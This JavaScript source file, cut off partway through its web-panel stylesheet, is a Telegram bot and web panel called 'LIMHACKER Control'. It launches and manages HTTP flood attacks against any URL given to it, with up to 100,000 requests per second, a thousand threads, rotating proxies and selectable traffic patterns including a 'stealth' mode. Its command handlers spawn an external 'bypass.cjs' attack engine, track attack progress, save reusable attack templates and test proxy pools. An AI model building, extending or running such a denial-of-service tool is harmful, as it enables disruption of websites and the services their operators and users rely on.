import { Telegraf } from 'telegraf';
import { spawn, exec } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import os from 'os';
import crypto from 'crypto';
import session from 'express-session';
import bodyParser from 'body-parser';
import http from 'http';
import https from 'https';
import si from 'systeminformation';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('\x1b[31m%s\x1b[0m', '⚡ Initializing LIMHACKER Control System...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('\x1b[31m%s\x1b[0m', '❌ ERROR: TELEGRAM_BOT_TOKEN missing');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'limhacker2026';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// ========== ADVANCED CONFIGURATION ==========
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 10,
    MAX_THREADS: 1000,
    MAX_RATE: 100000,
    MAX_DURATION: 7200,
    STATUS_UPDATE: 2000,
    METRICS_UPDATE: 5000,
    PROXY_CHECK: 60000,
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.75,
    MAX_AUTO_THREADS: 500,
    ATTACK_PATTERNS: ['constant', 'square', 'saw', 'random', 'exponential', 'stealth'],
    MAX_PROXY_FAILS: 3,
    PROXY_TEST_TIMEOUT: 5000,
    AUTO_ROTATE_INTERVAL: 300000,
    MAX_MEMORY: 1024 * 1024 * 1024,
    MAX_CPU: 80,
    MAX_BANDWIDTH: 100 * 1024 * 1024,
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 5000,
    ENABLE_COMPRESSION: true,
    ENABLE_CACHING: true,
    LOG_LEVEL: 'info'
};

// ========== DATA STORES ==========
const attacks = new Map();
const templates = new Map();
const schedules = new Map();
const proxyPool = new Map();
const userSessions = new Map();
const commandHistory = [];
const metrics = {
    startTime: Date.now(),
    totalAttacks: 0,
    totalRequests: 0,
    totalBytes: 0,
    totalSuccess: 0,
    totalFail: 0,
    peakRPS: 0,
    bandwidth: [],
    responseTime: []
};

// ========== PROXY MANAGER ==========
class ProxyManager {
    constructor() {
        this.proxies = new Map();
        this.stats = {
            total: 0,
            active: 0,
            dead: 0,
            avgLatency: 0,
            lastCheck: Date.now()
        };
        this.loadProxies();
        this.startHealthCheck();
    }

    loadProxies() {
        if (!fs.existsSync('proxy.txt')) return;
        try {
            const content = fs.readFileSync('proxy.txt', 'utf-8');
            const lines = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            lines.forEach(proxy => {
                if (!this.proxies.has(proxy)) {
                    this.proxies.set(proxy, {
                        fails: 0,
                        latency: [],
                        lastUsed: 0,
                        successCount: 0,
                        failCount: 0,
                        protocol: proxy.startsWith('https') ? 'HTTPS' : 'HTTP',
                        country: 'Unknown',
                        uptime: 100
                    });
                }
            });
            
            // Update stats
            this.updateStats();
            
            console.log('\x1b[31m%s\x1b[0m', `📡 Loaded ${this.proxies.size} proxies`);
        } catch (err) {
            console.error('Error loading proxies:', err);
        }
    }

    updateStats() {
        this.stats.total = this.proxies.size;
        this.stats.active = Array.from(this.proxies.values()).filter(d => d.fails < CONFIG.MAX_PROXY_FAILS).length;
        this.stats.dead = this.stats.total - this.stats.active;
        
        const latencies = Array.from(this.proxies.values())
            .flatMap(d => d.latency);
        this.stats.avgLatency = latencies.length > 0 
            ? Math.round(latencies.reduce((s, v) => s + v, 0) / latencies.length) 
            : 0;
    }

    getProxy(strategy = 'round-robin') {
        if (this.proxies.size === 0) return null;
        
        const validProxies = Array.from(this.proxies.entries())
            .filter(([_, data]) => data.fails < CONFIG.MAX_PROXY_FAILS);
        
        if (validProxies.length === 0) return null;
        
        let selected;
        switch (strategy) {
            case 'random':
                selected = validProxies[Math.floor(Math.random() * validProxies.length)];
                break;
            case 'fastest':
                selected = validProxies.sort((a, b) => {
                    const aLat = a[1].latency.reduce((s, v) => s + v, 0) / a[1].latency.length || Infinity;
                    const bLat = b[1].latency.reduce((s, v) => s + v, 0) / b[1].latency.length || Infinity;
                    return aLat - bLat;
                })[0];
                break;
            default:
                selected = validProxies[Math.floor(Math.random() * validProxies.length)];
        }
        
        selected[1].lastUsed = Date.now();
        return selected[0];
    }

    reportSuccess(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.successCount++;
            this.updateStats();
        }
    }

    reportFailure(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.fails++;
            data.failCount++;
            if (data.fails >= CONFIG.MAX_PROXY_FAILS) {
                console.log('\x1b[31m%s\x1b[0m', `❌ Removing dead proxy: ${proxy}`);
                this.proxies.delete(proxy);
            }
            this.updateStats();
        }
    }

    reportLatency(proxy, ms) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.latency.push(ms);
            if (data.latency.length > 10) data.latency.shift();
            this.updateStats();
        }
    }

    startHealthCheck() {
        setInterval(() => this.testProxies(), CONFIG.PROXY_CHECK);
    }

    async testProxies() {
        console.log('\x1b[33m%s\x1b[0m', '🔄 Testing proxies...');
        const testUrl = 'http://httpbin.org/get';
        
        for (const [proxy, data] of this.proxies) {
            if (data.fails >= CONFIG.MAX_PROXY_FAILS) continue;
            
            const [host, port] = proxy.split(':');
            const start = Date.now();
            
            try {
                await new Promise((resolve, reject) => {
                    const req = http.get({
                        hostname: host,
                        port: parseInt(port),
                        path: testUrl,
                        timeout: CONFIG.PROXY_TEST_TIMEOUT
                    }, (res) => {
                        const latency = Date.now() - start;
                        this.reportLatency(proxy, latency);
                        this.reportSuccess(proxy);
                        resolve();
                    });
                    
                    req.on('error', reject);
                    req.on('timeout', () => {
                        req.destroy();
                        reject(new Error('Timeout'));
                    });
                });
            } catch (err) {
                this.reportFailure(proxy);
            }
        }
        
        console.log('\x1b[32m%s\x1b[0m', `✅ Proxy check complete: ${this.stats.active} active`);
    }

    getStats() {
        return this.stats;
    }
}

const proxyManager = new ProxyManager();

// ========== SYSTEM MONITOR ==========
class SystemMonitor {
    constructor() {
        this.stats = {
            cpu: 0,
            memory: 0,
            uptime: 0,
            network: { rx: 0, tx: 0 },
            processes: 0
        };
        this.startMonitoring();
    }

    async getStats() {
        try {
            const cpu = await si.currentLoad();
            const mem = await si.mem();
            const net = await si.networkStats();
            const procs = await si.processes();
            
            return {
                cpu: Math.round(cpu.currentLoad),
                memory: {
                    total: mem.total,
                    used: mem.used,
                    free: mem.free,
                    percentage: Math.round((mem.used / mem.total) * 100)
                },
                uptime: os.uptime(),
                network: {
                    rx: net[0]?.rx_bytes || 0,
                    tx: net[0]?.tx_bytes || 0
                },
                processes: procs.all
            };
        } catch (err) {
            console.error('Error getting system stats:', err);
            return null;
        }
    }

    startMonitoring() {
        setInterval(async () => {
            this.stats = await this.getStats();
        }, CONFIG.METRICS_UPDATE);
    }
}

const systemMonitor = new SystemMonitor();

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    if (num === undefined || num === null) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function calculateSuccessRate(attack) {
    if (!attack.requestCount) return 0;
    return Math.round((attack.successCount / attack.requestCount) * 100);
}

function createProgressBar(percent, size = 20) {
    const filled = Math.floor(percent / 5);
    const bar = '█'.repeat(filled);
    const empty = '░'.repeat(size - filled);
    return bar + empty;
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        return content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
    } catch {
        return [];
    }
}

function validateUrl(url) {
    try {
        new URL(url);
        return true;
    } catch {
        return false;
    }
}

function sanitizeInput(input) {
    return input.replace(/[<>]/g, '');
}

// ========== TELEGRAM BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    LIMHACKER CONTROL v4.0                    │
├──────────────────────────────────────────────────────────────┤
│  Welcome, ${ctx.from.first_name}                              │
│  Status: ONLINE                                              │
│  Role: ${isAdmin ? 'ADMINISTRATOR' : 'OPERATOR'}             │
├──────────────────────────────────────────────────────────────┤
│  Commands:                                                    │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│  /stop <id>                                                  │
│  /list                                                       │
│  /stats                                                      │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>                                                │
│  /templates                                                  │
│  /setproxy                                                   │
│  /proxies                                                    │
│  /system                                                     │
│  /help                                                       │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.help((ctx) => {
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    COMMAND REFERENCE                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│    - url: target (http:// or https://)                       │
│    - time: duration in seconds (max: ${CONFIG.MAX_DURATION}) │
│    - rate: requests/second (max: ${CONFIG.MAX_RATE})         │
│    - threads: parallel threads (max: ${CONFIG.MAX_THREADS})  │
│    - pattern: constant, square, saw, random, exponential     │
│                                                              │
│  /stop <id>     - Stop specific attack                       │
│  /list          - List active attacks                        │
│  /stats         - System statistics                          │
│                                                              │
│  TEMPLATE COMMANDS                                            │
│  ──────────────────────────────────────────────────────────  │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>   - Load and execute template                  │
│  /templates     - List all templates                         │
│                                                              │
│  PROXY COMMANDS                                               │
│  ──────────────────────────────────────────────────────────  │
│  /setproxy      - Upload proxy.txt file                      │
│  /proxies       - Show proxy statistics                      │
│                                                              │
│  SYSTEM COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /system        - System information                         │
│  /help          - Show this help                             │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.command('test', (ctx) => ctx.reply('✅ LIMHACKER system operational'));

// ========== ATTACK COMMAND ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, pattern = 'constant'] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads> [pattern]');
    }

    if (!validateUrl(url)) {
        return ctx.reply('❌ Invalid URL format');
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ Maximum concurrent attacks reached');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Attack engine not found');
    }

    const proxies = loadAndCleanProxies();
    const attackId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const duration = Math.min(parseInt(time), CONFIG.MAX_DURATION);
    const attackRate = Math.min(parseInt(rate), CONFIG.MAX_RATE);
    const attackThreads = Math.min(parseInt(threads), CONFIG.MAX_THREADS);
    const attackPattern = CONFIG.ATTACK_PATTERNS.includes(pattern) ? pattern : 'constant';
    const startTime = Date.now();

    const statusMsg = await ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    ATTACK INITIALIZED                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${url.substring(0, 50)}                             │
├──────────────────────────────────────────────────────────────┤
│  Duration: ${duration}s                                      │
│  Rate: ${attackRate.toLocaleString()}/s                      │
│  Threads: ${attackThreads}                                   │
│  Pattern: ${attackPattern.toUpperCase()}                     │
│  Proxies: ${proxies.length}                                  │
└──────────────────────────────────────────────────────────────┘
    `);

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        duration.toString(),
        attackRate.toString(),
        attackThreads.toString(),
        'proxy.txt',
        attackPattern
    ]);

    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: attackRate,
        threads: attackThreads,
        pattern: attackPattern,
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        bytesTransferred: 0,
        statusCodes: {},
        responseTimes: [],
        isRunning: true,
        lastUpdate: Date.now()
    });

    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                let bytes = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = (attackData.statusCodes[code] || 0) + numCount;
                        bytes += numCount * 1024;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
                attackData.bytesTransferred += bytes;
                
                metrics.totalRequests += total - (attackData.lastTotal || 0);
                metrics.totalSuccess += success - (attackData.lastSuccess || 0);
                metrics.totalFail += (total - success) - (attackData.lastFail || 0);
                metrics.totalBytes += bytes;
                
                const now = Date.now();
                const timeDiff = (now - attackData.lastUpdate) / 1000;
                const reqDiff = total - (attackData.lastTotal || 0);
                const currentRPS = Math.floor(reqDiff / timeDiff);
                
                if (currentRPS > metrics.peakRPS) {
                    metrics.peakRPS = currentRPS;
                }
                
                const mbps = (bytes * 8) / (1024 * 1024 * timeDiff);
                metrics.bandwidth.push(mbps);
                if (metrics.bandwidth.length > 60) metrics.bandwidth.shift();
                
                attackData.lastTotal = total;
                attackData.lastSuccess = success;
                attackData.lastFail = total - success;
                attackData.lastUpdate = now;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Error:`, data.toString());
    });

    attack.on('error', (err) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Process error:`, err.message);
        ctx.reply(`⚠️ Attack error: ${err.message}`);
        attacks.delete(attackId);
    });

    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        const successRate = calculateSuccessRate(attackData);
        
        const now = Date.now();
        const timeDiff = (now - attackData.lastUpdate) / 1000;
        const reqDiff = attackData.requestCount - (attackData.lastTotal || 0);
        const currentRPS = Math.floor(reqDiff / Math.max(0.1, timeDiff));
        
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `HTTP ${code}: ${count}`)
            .join(' | ');

        const progressBar = createProgressBar(percent);
        const bandwidth = (attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed));
        
        const updateMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK IN PROGRESS                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Progress: ${progressBar} ${percent}%                        │
│  Elapsed: ${elapsed}s / ${attackData.duration}s              │
├──────────────────────────────────────────────────────────────┤
│  Requests: ${formatNumber(attackData.requestCount)}          │
│  Success: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Current RPS: ${currentRPS}                                  │
│  Bandwidth: ${bandwidth.toFixed(2)} Mbps                     │
│  Status: ${topCodes || 'Collecting...'}                      │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.STATUS_UPDATE);

    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        metrics.totalAttacks++;
        
        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const successRate = calculateSuccessRate(attackData);
        const avgRPS = Math.floor(attackData.requestCount / Math.max(1, elapsed));
        
        const codeBreakdown = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `  HTTP ${code}: ${formatNumber(count)}`)
            .join('\n');

        const finalMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK COMPLETE                            │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${attackData.url}                                   │
│  Duration: ${elapsed}s / ${attackData.duration}s             │
├──────────────────────────────────────────────────────────────┤
│  Total Requests: ${formatNumber(attackData.requestCount)}    │
│  Successful: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Failed: ${formatNumber(attackData.failCount)}               │
│  Average RPS: ${avgRPS}                                      │
│  Bandwidth: ${((attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed))).toFixed(2)} Mbps │
├──────────────────────────────────────────────────────────────┤
│  Status Code Analysis:                                        │
${codeBreakdown || '  No data collected'}
├──────────────────────────────────────────────────────────────┤
│  Operator: ${attackData.username}                            │
│  Pattern: ${attackData.pattern.toUpperCase()}                │
│  Exit Code: ${code}                                          │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== STOP COMMAND ==========
bot.command('stop', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) return ctx.reply('❌ Attack not found');
    
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not authorized to stop this attack');
    }

    attack.process.kill('SIGINT');
    ctx.reply(`🛑 Attack ${attackId} terminated`);
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) return ctx.reply('📊 No active attacks');

    let msg = '┌──────────────────────────────────────────────────────────────┐\n';
    msg += '│                    ACTIVE ATTACKS                               │\n';
    msg += '├──────────────────────────────────────────────────────────────┤\n';
    
    attacks.forEach((a, id) => {
        if (!a.isRunning) return;
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / a.duration) * 100));
        const progressBar = createProgressBar(percent, 10);
        
        msg += `│  ID: ${id} | ${a.username}\n`;
        msg += `│  ${a.url.substring(0, 40)}...\n`;
        msg += `│  ${progressBar} ${percent}% | ${elapsed}s/${a.duration}s\n`;
        msg += `│  Req: ${formatNumber(a.requestCount)} | Success: ${calculateSuccessRate(a)}%\n`;
        msg += '├──────────────────────────────────────────────────────────────┤\n';
    });
    
    msg += `└──────────────────────────────────────────────────────────────┘`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    const proxyStats = proxyManager.getStats();
    const uptime = process.uptime();
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM STATISTICS                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK METRICS                                               │
│  ──────────────────────────────────────────────────────────  │
│  Active: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}          │
│  Total Attacks: ${metrics.totalAttacks}                       │
│  Templates: ${templates.size}                                 │
│                                                              │
│  TRAFFIC ANALYSIS                                             │
│  ──────────────────────────────────────────────────────────  │
│  Total Requests: ${formatNumber(totalReqs)}                   │
│  Success Rate: ${totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0}% │
│  Peak RPS: ${metrics.peakRPS}                                 │
│  Bandwidth: ${formatBytes(metrics.totalBytes)}                │
│                                                              │
│  PROXY NETWORK                                                │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${proxyStats.total}                                   │
│  Active: ${proxyStats.active}                                 │
│  Avg Latency: ${proxyStats.avgLatency}ms                      │
│                                                              │
│  SYSTEM                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Uptime: ${formatDuration(uptime)}                            │
│  Memory: ${formatBytes(process.memoryUsage().rss)}            │
│  CPU Cores: ${os.cpus().length}                               │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROXY COMMANDS ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    ctx.reply('📤 Send proxy.txt file (format: ip:port)');
});

bot.command('proxies', (ctx) => {
    const stats = proxyManager.getStats();
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    PROXY NETWORK STATUS                       │
├──────────────────────────────────────────────────────────────┤
│  Total Proxies: ${stats.total}                                │
│  Active: ${stats.active}                                      │
│  Dead: ${stats.dead}                                          │
│  Average Latency: ${stats.avgLatency}ms                       │
│  Last Check: ${new Date(stats.lastCheck).toLocaleTimeString()} │
└──────────────────────────────────────────────────────────────┘

Commands:
/proxy test - Test proxy health
/proxy list - List all proxies`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('proxy', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const subcmd = args[0];

    if (subcmd === 'test') {
        const msg = await ctx.reply('🔄 Testing proxies...');
        await proxyManager.testProxies();
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, 
            `✅ Proxy test complete. Active: ${proxyManager.getStats().active}`);
    } else if (subcmd === 'list') {
        const proxies = Array.from(proxyManager.proxies.entries())
            .slice(0, 10)
            .map(([p, d]) => `• ${p} (${d.latency.length > 0 ? Math.round(d.latency.reduce((s, v) => s + v, 0) / d.latency.length) + 'ms' : 'untested'})`)
            .join('\n');
        ctx.reply(`📋 Proxy List\n\n${proxies || 'No proxies loaded'}\n\n_Showing first 10 of ${proxyManager.proxies.size}_`, { parse_mode: 'Markdown' });
    }
});

// ========== TEMPLATE COMMANDS ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads, pattern = 'constant'] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /save <name> <url> <time> <rate> <threads> [pattern]');
    }
    
    templates.set(name, { url, time, rate, threads, pattern });
    ctx.reply(`✅ Template saved: \`${name}\``);
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) return ctx.reply('❌ Template not found');
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads} ${template.pattern}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) return ctx.reply('📭 No templates');
    
    let msg = '📋 *Templates*\n\n';
    templates.forEach((data, name) => {
        msg += `*${name}*\n`;
        msg += `  Target: ${data.url}\n`;
        msg += `  Duration: ${data.time}s | Rate: ${data.rate}/s | Threads: ${data.threads}\n`;
        msg += `  Pattern: ${data.pattern.toUpperCase()}\n\n`;
    });
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('delete', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const name = ctx.message.text.split(' ')[1];
    if (templates.delete(name)) {
        ctx.reply(`✅ Template deleted: ${name}`);
    } else {
        ctx.reply('❌ Template not found');
    }
});

// ========== STOP ALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// ========== SYSTEM COMMAND ==========
bot.command('system', async (ctx) => {
    const stats = await systemMonitor.getStats();
    if (!stats) return ctx.reply('❌ Could not retrieve system stats');
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM INFORMATION                         │
├──────────────────────────────────────────────────────────────┤
│  CPU                                                          │
│  ──────────────────────────────────────────────────────────  │
│  Usage: ${stats.cpu}%                                         │
│  Cores: ${os.cpus().length}                                   │
│  Model: ${os.cpus()[0].model.substring(0, 30)}...            │
│                                                              │
│  MEMORY                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${formatBytes(stats.memory.total)}                    │
│  Used: ${formatBytes(stats.memory.used)} (${stats.memory.percentage}%) │
│  Free: ${formatBytes(stats.memory.free)}                      │
│                                                              │
│  NETWORK                                                      │
│  ──────────────────────────────────────────────────────────  │
│  Received: ${formatBytes(stats.network.rx)}                   │
│  Transmitted: ${formatBytes(stats.network.tx)}                │
│                                                              │
│  PROCESSES                                                    │
│  ──────────────────────────────────────────────────────────  │
│  Running: ${stats.processes}                                  │
│                                                              │
│  UPTIME                                                       │
│  ──────────────────────────────────────────────────────────  │
│  ${formatDuration(stats.uptime)}                              │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== FILE HANDLER ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxy file...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            proxyManager.loadProxies();
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies`
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    }
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('\x1b[31m%s\x1b[0m', `[ERROR] ${err.message}`);
});

// ========== EXPRESS SERVER WITH RED THEME ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

// Session configuration
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 3600000,
        httpOnly: true,
        sameSite: 'strict'
    }
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Compression middleware
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

const isAuthenticated = (req, res, next) => {
    if (req.session.authenticated) next();
    else res.status(401).json({ error: 'Unauthorized' });
};

// Professional Red Theme CSS
const redTheme = `
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    :root {
        --bg-primary: #0a0505;
        --bg-secondary: #1a0a0a;
        --bg-tertiary: #2a0f0f;
        --text-primary: #ffcccc;
        --text-secondary: #ff9999;
        --text-muted: #ff6666;
        --accent-primary: #ff0000;
        --accent-secondary: #cc0000;
        --accent-warning: #ff4444;
        --accent-danger: #ff0000;
        --border-color: #660000;
        --shadow-color: rgba(255, 0, 0, 0.2);
        --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
        --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    * {
        scrollbar-width: thin;
        scrollbar-color: var(--accent-primary) var(--bg-tertiary);
    }

    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }

    ::-webkit-scrollbar-track {
        background: var(--bg-tertiary);
    }

    ::-webkit-scrollbar-thumb {
        background: var(--accent-primary);
        border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: var(--accent-secondary);
    }

    body {
        background: var(--bg-primary);
        color: var(--text-primary);
        font-family: var(--font-sans);
        line-height: 1.6;
        min-height: 100vh;
        position: relative;
    }

    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(circle at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(255, 0, 0, 0.05) 0%, transparent 50%);
        pointer-events: none;
        z-index: 0;
    }

    .container {
        max-width: 1600px;
        margin: 0 auto;
        padding: 2rem;
        position: relative;
        z-index: 1;
    }

    /* Header Styles */
    .header {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        margin-bottom: 2rem;
        box-shadow: 0 4px 20px var(--shadow-color);
        backdrop-filter: blur(10px);
        border-left: 4px solid var(--accent-primary);
    }

    .header-content {
        display: flex;
        justify-content: space-between;
